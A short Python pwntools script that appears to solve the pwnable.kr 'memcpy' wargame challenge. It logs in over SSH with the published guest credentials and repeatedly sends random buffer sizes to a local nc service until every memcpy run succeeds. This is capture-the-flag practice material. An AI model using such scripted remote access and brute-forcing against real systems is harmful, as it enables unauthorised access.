from pwn import *
import random

shell = ssh('memcpy', 'pwnable.kr', 2222, password='guest')

size_s = [10, 20, 40, 69, 128, 256, 512, 1024, 2048, 4096]

while True:
    sh = shell.process('/bin/sh', env={'PS1':''})
    sh.sendline('nc 0 9022')

    for i in range(10):
        print(sh.recvuntil("{} ~ {} :".format(8 * (2 ** i), 8 * (2 ** (i + 1)))))
        rand_num = random.randrange(8 * (2 ** i), 8 * (2 ** (i + 1)))
        print("send : {} bytes".format(rand_num))
        sh.sendline(str(rand_num))

    print(sh.recvline())
    
    counter = 0
    
    while counter <= 9:
        print("[*]counter = {}".format(counter))
        result = sh.recvuntil("slow_memcpy")
        result += sh.recvline()
        result += sh.recvline(timeout=0.1)
        #result += sh.recvline()
        
        if ("fast_memcpy" in result):
            print(result)
            counter += 1
        else:
            print("Woooooops!")
            size_s[counter] += 1
            print(sh.recv(2560))
            break

    sh.kill()
    if counter == 10:
        print(sh.recv(2560))
        break
